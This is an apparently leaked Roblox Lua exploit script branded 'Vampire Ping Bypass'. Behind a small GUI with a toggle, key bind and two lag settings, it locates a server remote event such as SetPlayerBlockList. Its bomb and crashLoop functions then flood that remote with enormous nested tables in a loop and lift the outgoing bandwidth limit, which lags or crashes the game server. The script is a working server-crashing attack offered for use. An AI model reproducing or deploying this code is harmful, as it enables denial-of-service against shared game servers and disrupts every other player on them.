print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local NetworkClient = game:GetService("NetworkClient")

local LocalPlayer = Players.LocalPlayer

local CONFIG = {
    Names = {
        ScreenGui = "VampirePingBypass",
        MainFrame = "Main",
        ArtHolder = "ArtHolder",
        Panel = "Panel",
        ReopenBtn = "Reopen"
    },
    Size = {
        MainFrame = UDim2.new(0, 282, 0, 258),
        ReopenBtn = UDim2.new(0, 56, 0, 26),
        ArtHolder = UDim2.new(0, 100, 1, -16),
        Panel = UDim2.new(1, -124, 1, -16),
        ToggleButton = UDim2.new(1, -4, 0, 46),
        OptionFrame = UDim2.new(1, -2, 0, 34)
    },
    Position = {
        MainFrame = UDim2.new(0.5, -141, 0.5, -129),
        ReopenBtn = UDim2.new(0, 20, 0.5, -13),
        ArtHolder = UDim2.new(0, 8, 0, 8),
        Panel = UDim2.new(0, 116, 0, 8)
    },
    Colors = {
        MainBackground = Color3.fromRGB(18, 10, 14),
        PanelBackground = Color3.fromRGB(10, 6, 8),
        OptionBackground = Color3.fromRGB(40, 22, 30),
        ButtonDisabled = Color3.fromRGB(30, 16, 22),
        ButtonEnabled = Color3.fromRGB(140, 30, 30),
        Accent = Color3.fromRGB(220, 45, 45),
        TextPrimary = Color3.fromRGB(245, 235, 238),
        TextSecondary = Color3.fromRGB(150, 120, 128)
    },
    Text = {
        Title = "Vampire Ping Bypass",
        Footer = "discord.gg/vampirehub",
        ArtText = "VAMPIRE",
        DefaultBind = Enum.KeyCode.F
    },
    Images = {
        VampireArt = "rbxassetid://14640607134"
    },
    Values = {
        Option1Default = 22,
        Option2Default = 120
    }
}

local GUI, MainFrame, ReopenBtn
local ArtHolder, ArtImage, ArtGradient, ArtTitle, CloseBtn
local Panel, TitleLabel, ToggleBtn
local BindFrame, BindTitle, BindBtn
local Option1Frame, Opt1Title, Opt1Val, Opt1Minus, Opt1Plus
local Option2Frame, Opt2Title, Opt2Val, Opt2Minus, Opt2Plus
local FooterLabel

local isEnabled = false
local currentBind = CONFIG.Text.DefaultBind
local isBinding = false
local opt1Value = CONFIG.Values.Option1Default  -- lag1
local opt2Value = CONFIG.Values.Option2Default  -- lag2

local laggerEnabled = false
local laggerThread = nil
local cachedRemote = nil

local cfg = {
    lag1 = opt1Value,
    lag2 = opt2Value,
    tries = 2,
    waitTime = 0.045
}

local function createCorner(parent, radius)
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, radius)
    corner.Parent = parent
    return corner
end

local function createStroke(parent, color, thickness, transparency)
    local stroke = Instance.new("UIStroke")
    stroke.Color = color
    stroke.Thickness = thickness
    stroke.Transparency = transparency
    stroke.Parent = parent
    return stroke
end

local function makeDraggable(frame)
    local dragging, dragInput, dragStart, startPos

    local function update(input)
        local delta = input.Position - dragStart
        TweenService:Create(frame, TweenInfo.new(0.1), {
            Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        }):Play()
    end

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end

local function getDirectRemote()
    local ok, result = pcall(function()
        return game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList")
    end)
    if ok and result and (result:IsA("RemoteEvent") or result:IsA("UnreliableRemoteEvent") or result:IsA("RemoteFunction")) then
        return result
    end
    return nil
end

local function findRemote()
    if cachedRemote and cachedRemote.Parent then return cachedRemote end
    local paths = {
        function() return game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList") end,
        function() return ReplicatedStorage:FindFirstChild("SetPlayerBlockList") end,
        function() return game:FindFirstChild("SetPlayerBlockList", true) end,
    }
    for _, pathFn in ipairs(paths) do
        local ok, result = pcall(pathFn)
        if ok and result and (result:IsA("RemoteEvent") or result:IsA("UnreliableRemoteEvent") or result:IsA("RemoteFunction")) then
            cachedRemote = result; return result
        end
    end
    local services = {ReplicatedStorage, game:FindFirstChild("RobloxReplicatedStorage")}
    for _, service in ipairs(services) do
        if service then
            for _, obj in ipairs(service:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") or obj:IsA("RemoteFunction") then
                    local n = obj.Name:lower()
                    if n:find("block") or n:find("steal") or n:find("accept")
                    or n:find("report") or n:find("player") or n:find("lag") then
                        cachedRemote = obj; return obj
                    end
                end
            end
        end
    end
    for _, service in ipairs(services) do
        if service then
            for _, obj in ipairs(service:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") then
                    cachedRemote = obj; return obj
                end
            end
        end
    end
    return nil
end

local function getRemote()
    return getDirectRemote() or findRemote()
end

local function bomb(tableincrease, maxCap, tries)
    local maintable = {}
    local spammedtable = {{}}
    local z = spammedtable[1]
    for i = 1, tableincrease do
        local t = {}; table.insert(z, t); z = t
    end
    local maximum = math.min(99999 / (tableincrease + 2), maxCap * 5)
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 5000 == 0 then task.wait() end
    end
    local remote = getRemote()
    if remote then
        for i = 1, tries do
            local ok = pcall(function()
                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                    remote:FireServer(maintable)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(maintable)
                end
            end)
            if not ok then cachedRemote = nil end
        end
    end
end

local function crashLoop()
    while laggerEnabled do
        pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
        pcall(function() settings().Network.IncomingReplicationLag = 0 end)
        bomb(cfg.lag1, cfg.lag2, cfg.tries)
        pcall(function()
            for i = 1, 30 do
                game:GetService("Stats"):Get("Network.ServerStatsItem")
            end
        end)
        task.wait(cfg.waitTime)
    end
end

local function startLagger()
    if laggerThread then return end
    laggerEnabled = true
    laggerThread = coroutine.create(crashLoop)
    coroutine.resume(laggerThread)
    updateToggleUI()
end

local function stopLagger()
    laggerEnabled = false
    if laggerThread then
        pcall(function() coroutine.close(laggerThread) end)
        laggerThread = nil
    end
    updateToggleUI()
end

local function toggleLagger()
    if laggerEnabled then
        stopLagger()
    else
        startLagger()
    end
end

local CONFIG_FILE = "VampPinglagger"

local function saveConfig()
    local data = {
        lag1 = cfg.lag1,
        lag2 = cfg.lag2,
        tries = cfg.tries,
        waitTime = cfg.waitTime,
        key = currentBind.Name,
        enabled = laggerEnabled
    }
    local json = HttpService:JSONEncode(data)
    pcall(function()
        writefile(CONFIG_FILE, json)
    end)
end

local function loadConfig()
    local ok, data = pcall(function()
        return readfile(CONFIG_FILE)
    end)
    if ok and data then
        local decoded = HttpService:JSONDecode(data)
        cfg.lag1 = decoded.lag1 or cfg.lag1
        cfg.lag2 = decoded.lag2 or cfg.lag2
        cfg.tries = decoded.tries or cfg.tries
        cfg.waitTime = decoded.waitTime or cfg.waitTime
        if decoded.key then
            local key = Enum.KeyCode[decoded.key]
            if key then currentBind = key end
        end
        if decoded.enabled then
            -- if was enabled, start after UI loads
            task.wait(0.5)
            startLagger()
        end
        -- update UI values
        opt1Value = cfg.lag1
        opt2Value = cfg.lag2
        if Opt1Val then Opt1Val.Text = tostring(opt1Value) end
        if Opt2Val then Opt2Val.Text = tostring(opt2Value) end
        if BindBtn then BindBtn.Text = currentBind.Name end
    end
end

local function createGUI()
    GUI = Instance.new("ScreenGui")
    GUI.Name = CONFIG.Names.ScreenGui
    GUI.ResetOnSpawn = false
    GUI.DisplayOrder = 999
    GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local success = pcall(function() GUI.Parent = CoreGui end)
    if not success then GUI.Parent = LocalPlayer:WaitForChild("PlayerGui") end

    MainFrame = Instance.new("Frame")
    MainFrame.Name = CONFIG.Names.MainFrame
    MainFrame.Size = CONFIG.Size.MainFrame
    MainFrame.Position = CONFIG.Position.MainFrame
    MainFrame.BackgroundColor3 = CONFIG.Colors.MainBackground
    MainFrame.BorderSizePixel = 0
    MainFrame.Active = true
    MainFrame.Parent = GUI
    
    createCorner(MainFrame, 14)
    createStroke(MainFrame, CONFIG.Colors.Accent, 1.5, 0.35)

    ReopenBtn = Instance.new("TextButton")
    ReopenBtn.Name = CONFIG.Names.ReopenBtn
    ReopenBtn.Size = CONFIG.Size.ReopenBtn
    ReopenBtn.Position = CONFIG.Position.ReopenBtn
    ReopenBtn.BackgroundColor3 = CONFIG.Colors.ButtonDisabled
    ReopenBtn.Text = "OPEN"
    ReopenBtn.TextColor3 = CONFIG.Colors.Accent
    ReopenBtn.Font = Enum.Font.GothamBold
    ReopenBtn.TextSize = 12
    ReopenBtn.Visible = false
    ReopenBtn.Parent = GUI
    
    createCorner(ReopenBtn, 8)
    createStroke(ReopenBtn, CONFIG.Colors.Accent, 1.5, 0.3)

    ArtHolder = Instance.new("Frame")
    ArtHolder.Name = CONFIG.Names.ArtHolder
    ArtHolder.Size = CONFIG.Size.ArtHolder
    ArtHolder.Position = CONFIG.Position.ArtHolder
    ArtHolder.BackgroundColor3 = CONFIG.Colors.PanelBackground
    ArtHolder.ClipsDescendants = true
    ArtHolder.Parent = MainFrame
    createCorner(ArtHolder, 10)

    ArtImage = Instance.new("ImageLabel")
    ArtImage.Size = UDim2.new(1, 0, 1, 0)
    ArtImage.BackgroundTransparency = 1
    ArtImage.Image = CONFIG.Images.VampireArt
    ArtImage.ScaleType = Enum.ScaleType.Crop
    ArtImage.Parent = ArtHolder

    ArtGradient = Instance.new("Frame")
    ArtGradient.Size = UDim2.new(1, 0, 0, 50)
    ArtGradient.Position = UDim2.new(0, 0, 1, -50)
    ArtGradient.BackgroundColor3 = CONFIG.Colors.PanelBackground
    ArtGradient.BorderSizePixel = 0
    ArtGradient.ZIndex = 3
    ArtGradient.Parent = ArtHolder
    
    local grad = Instance.new("UIGradient")
    grad.Rotation = 90
    grad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 1),
        NumberSequenceKeypoint.new(0.15, 0),
        NumberSequenceKeypoint.new(1, 0)
    })
    grad.Parent = ArtGradient

    ArtTitle = Instance.new("TextLabel")
    ArtTitle.Size = UDim2.new(1, 0, 0, 20)
    ArtTitle.Position = UDim2.new(0, 0, 1, -24)
    ArtTitle.BackgroundTransparency = 1
    ArtTitle.Text = CONFIG.Text.ArtText
    ArtTitle.TextColor3 = CONFIG.Colors.TextPrimary
    ArtTitle.Font = Enum.Font.GothamBold
    ArtTitle.TextSize = 14
    ArtTitle.ZIndex = 4
    ArtTitle.Parent = ArtHolder

    CloseBtn = Instance.new("TextButton")
    CloseBtn.Size = UDim2.new(1, -12, 0, 20)
    CloseBtn.Position = UDim2.new(0, 6, 0, 6)
    CloseBtn.BackgroundTransparency = 0.25
    CloseBtn.BackgroundColor3 = CONFIG.Colors.MainBackground
    CloseBtn.Text = "CLOSE"
    CloseBtn.TextColor3 = CONFIG.Colors.TextPrimary
    CloseBtn.Font = Enum.Font.GothamBold
    CloseBtn.TextSize = 12
    CloseBtn.ZIndex = 5
    CloseBtn.Parent = ArtHolder
    createCorner(CloseBtn, 6)

    Panel = Instance.new("Frame")
    Panel.Name = CONFIG.Names.Panel
    Panel.Size = CONFIG.Size.Panel
    Panel.Position = CONFIG.Position.Panel
    Panel.BackgroundTransparency = 1
    Panel.Parent = MainFrame

    TitleLabel = Instance.new("TextLabel")
    TitleLabel.Size = UDim2.new(1, -8, 0, 22)
    TitleLabel.Position = UDim2.new(0, 4, 0, 4)
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Text = CONFIG.Text.Title
    TitleLabel.TextColor3 = CONFIG.Colors.TextPrimary
    TitleLabel.Font = Enum.Font.GothamBold
    TitleLabel.TextSize = 15
    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
    TitleLabel.Parent = Panel

    ToggleBtn = Instance.new("TextButton")
    ToggleBtn.Size = CONFIG.Size.ToggleButton
    ToggleBtn.Position = UDim2.new(0, 4, 0, 34)
    ToggleBtn.BackgroundColor3 = CONFIG.Colors.ButtonDisabled
    ToggleBtn.Text = "DISABLED"
    ToggleBtn.TextColor3 = CONFIG.Colors.TextSecondary
    ToggleBtn.Font = Enum.Font.GothamBold
    ToggleBtn.TextSize = 18
    ToggleBtn.Parent = Panel
    createCorner(ToggleBtn, 6)
    createStroke(ToggleBtn, CONFIG.Colors.Accent, 1, 0.4)

    local function createOptionRow(yPos, text, defaultVal)
        local frame = Instance.new("Frame")
        frame.Size = CONFIG.Size.OptionFrame
        frame.Position = UDim2.new(0, 4, 0, yPos)
        frame.BackgroundColor3 = CONFIG.Colors.OptionBackground
        frame.Parent = Panel
        createCorner(frame, 6)

        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(0.5, 0, 1, 0)
        title.Position = UDim2.new(0, 10, 0, 0)
        title.BackgroundTransparency = 1
        title.Text = text
        title.TextColor3 = CONFIG.Colors.TextPrimary
        title.Font = Enum.Font.GothamSemibold
        title.TextSize = 12
        title.TextXAlignment = Enum.TextXAlignment.Left
        title.Parent = frame

        return frame, title
    end

    BindFrame, BindTitle = createOptionRow(88, "Bind")
    BindBtn = Instance.new("TextButton")
    BindBtn.Size = UDim2.new(0, 44, 0, 20)
    BindBtn.Position = UDim2.new(1, -50, 0.5, -10)
    BindBtn.BackgroundColor3 = CONFIG.Colors.Accent
    BindBtn.Text = currentBind.Name
    BindBtn.TextColor3 = CONFIG.Colors.TextPrimary
    BindBtn.Font = Enum.Font.GothamBold
    BindBtn.TextSize = 12
    BindBtn.Parent = BindFrame
    createCorner(BindBtn, 4)

    Option1Frame, Opt1Title = createOptionRow(126, "Lag 1:")
    Opt1Minus = Instance.new("TextButton")
    Opt1Minus.Size = UDim2.new(0, 18, 0, 18)
    Opt1Minus.Position = UDim2.new(1, -68, 0.5, -9)
    Opt1Minus.BackgroundColor3 = CONFIG.Colors.MainBackground
    Opt1Minus.Text = "-"
    Opt1Minus.TextColor3 = CONFIG.Colors.TextPrimary
    Opt1Minus.Font = Enum.Font.GothamBold
    Opt1Minus.Parent = Option1Frame
    createCorner(Opt1Minus, 4)

    Opt1Val = Instance.new("TextLabel")
    Opt1Val.Size = UDim2.new(0, 30, 1, 0)
    Opt1Val.Position = UDim2.new(1, -48, 0, 0)
    Opt1Val.BackgroundTransparency = 1
    Opt1Val.Text = tostring(opt1Value)
    Opt1Val.TextColor3 = CONFIG.Colors.Accent
    Opt1Val.Font = Enum.Font.GothamBold
    Opt1Val.TextSize = 13
    Opt1Val.Parent = Option1Frame

    Opt1Plus = Instance.new("TextButton")
    Opt1Plus.Size = UDim2.new(0, 18, 0, 18)
    Opt1Plus.Position = UDim2.new(1, -18, 0.5, -9)
    Opt1Plus.BackgroundColor3 = CONFIG.Colors.MainBackground
    Opt1Plus.Text = "+"
    Opt1Plus.TextColor3 = CONFIG.Colors.TextPrimary
    Opt1Plus.Font = Enum.Font.GothamBold
    Opt1Plus.Parent = Option1Frame
    createCorner(Opt1Plus, 4)

    Option2Frame, Opt2Title = createOptionRow(164, "Lag 2:")
    Opt2Minus = Instance.new("TextButton")
    Opt2Minus.Size = UDim2.new(0, 18, 0, 18)
    Opt2Minus.Position = UDim2.new(1, -68, 0.5, -9)
    Opt2Minus.BackgroundColor3 = CONFIG.Colors.MainBackground
    Opt2Minus.Text = "-"
    Opt2Minus.TextColor3 = CONFIG.Colors.TextPrimary
    Opt2Minus.Font = Enum.Font.GothamBold
    Opt2Minus.Parent = Option2Frame
    createCorner(Opt2Minus, 4)

    Opt2Val = Instance.new("TextLabel")
    Opt2Val.Size = UDim2.new(0, 30, 1, 0)
    Opt2Val.Position = UDim2.new(1, -48, 0, 0)
    Opt2Val.BackgroundTransparency = 1
    Opt2Val.Text = tostring(opt2Value)
    Opt2Val.TextColor3 = CONFIG.Colors.Accent
    Opt2Val.Font = Enum.Font.GothamBold
    Opt2Val.TextSize = 13
    Opt2Val.Parent = Option2Frame

    Opt2Plus = Instance.new("TextButton")
    Opt2Plus.Size = UDim2.new(0, 18, 0, 18)
    Opt2Plus.Position = UDim2.new(1, -18, 0.5, -9)
    Opt2Plus.BackgroundColor3 = CONFIG.Colors.MainBackground
    Opt2Plus.Text = "+"
    Opt2Plus.TextColor3 = CONFIG.Colors.TextPrimary
    Opt2Plus.Font = Enum.Font.GothamBold
    Opt2Plus.Parent = Option2Frame
    createCorner(Opt2Plus, 4)

    FooterLabel = Instance.new("TextLabel")
    FooterLabel.Size = UDim2.new(1, -4, 0, 18)
    FooterLabel.Position = UDim2.new(0, 4, 0, 204)
    FooterLabel.BackgroundTransparency = 1
    FooterLabel.Text = CONFIG.Text.Footer
    FooterLabel.TextColor3 = CONFIG.Colors.TextSecondary
    FooterLabel.Font = Enum.Font.Gotham
    FooterLabel.TextSize = 12
    FooterLabel.Parent = Panel

    makeDraggable(MainFrame)
end

-- // [8] UI UPDATE FUNCTIONS //
function updateToggleUI()
    if laggerEnabled then
        ToggleBtn.Text = "ENABLED"
        ToggleBtn.TextColor3 = CONFIG.Colors.TextPrimary
        ToggleBtn.BackgroundColor3 = CONFIG.Colors.ButtonEnabled
    else
        ToggleBtn.Text = "DISABLED"
        ToggleBtn.TextColor3 = CONFIG.Colors.TextSecondary
        ToggleBtn.BackgroundColor3 = CONFIG.Colors.ButtonDisabled
    end
end

-- // [9] CONNECTIONS //
local function setupConnections()
    CloseBtn.MouseButton1Click:Connect(function()
        MainFrame.Visible = false
        ReopenBtn.Visible = true
    end)

    ReopenBtn.MouseButton1Click:Connect(function()
        MainFrame.Visible = true
        ReopenBtn.Visible = false
    end)

    ToggleBtn.MouseButton1Click:Connect(function()
        toggleLagger()
        saveConfig()
    end)

    BindBtn.MouseButton1Click:Connect(function()
        BindBtn.Text = "..."
        isBinding = true
    end)

    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if isBinding and input.UserInputType == Enum.UserInputType.Keyboard then
            currentBind = input.KeyCode
            BindBtn.Text = currentBind.Name
            isBinding = false
            saveConfig()
        elseif not gameProcessed and input.KeyCode == currentBind then
            MainFrame.Visible = not MainFrame.Visible
            ReopenBtn.Visible = not MainFrame.Visible
        end
    end)

    Opt1Minus.MouseButton1Click:Connect(function()
        opt1Value = math.max(1, opt1Value - 1)
        Opt1Val.Text = tostring(opt1Value)
        cfg.lag1 = opt1Value
        if laggerEnabled then
            stopLagger()
            task.wait(0.1)
            startLagger()
        end
        saveConfig()
    end)
    Opt1Plus.MouseButton1Click:Connect(function()
        opt1Value = math.min(5000, opt1Value + 1)
        Opt1Val.Text = tostring(opt1Value)
        cfg.lag1 = opt1Value
        if laggerEnabled then
            stopLagger()
            task.wait(0.1)
            startLagger()
        end
        saveConfig()
    end)

    Opt2Minus.MouseButton1Click:Connect(function()
        opt2Value = math.max(1, opt2Value - 10)
        Opt2Val.Text = tostring(opt2Value)
        cfg.lag2 = opt2Value
        saveConfig()
    end)
    Opt2Plus.MouseButton1Click:Connect(function()
        opt2Value = math.min(5000, opt2Value + 10)
        Opt2Val.Text = tostring(opt2Value)
        cfg.lag2 = opt2Value
        saveConfig()
    end)

    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(1.2)
        if laggerEnabled then
            stopLagger()
            task.wait(0.3)
            startLagger()
        end
    end)
end

local function init()
    createGUI()
    setupConnections()
    loadConfig()
    updateToggleUI()
end

init()

print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")
print("leaked by slivin and eugene🥷")